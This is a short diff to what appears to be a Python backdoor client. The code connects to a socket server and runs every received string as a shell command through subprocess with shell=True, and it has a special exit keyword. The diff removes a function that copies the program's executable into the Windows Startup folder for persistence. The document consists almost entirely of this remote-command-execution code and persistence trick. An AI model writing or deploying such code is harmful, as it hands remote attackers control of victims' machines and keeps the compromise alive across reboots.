@@ -3,13 +3,6 @@ import sys
 import subprocess
 import os
 
-
-def autorun():
-    file = os.path.basename(__file__)
-    exe_file = file.replace('.py', '.exe')
-    os.system(r'copy {} \"%APPDATA%\\Microsoft\Windows\\Start Menu\\Programs\\Startup\"'.format(exe_file))
-
-
 host = '127.0.0.1'
 port = 8080
 
@@ -22,7 +15,7 @@ except Exception as e:
 while True:
     try:
         comm = client.recv(1024).decode()
-        if comm == '\kill':
+        if comm == '\close':
             break
         else:
             output = subprocess.check_output(comm, stderr=subprocess.STDOUT, shell=True, text=True)
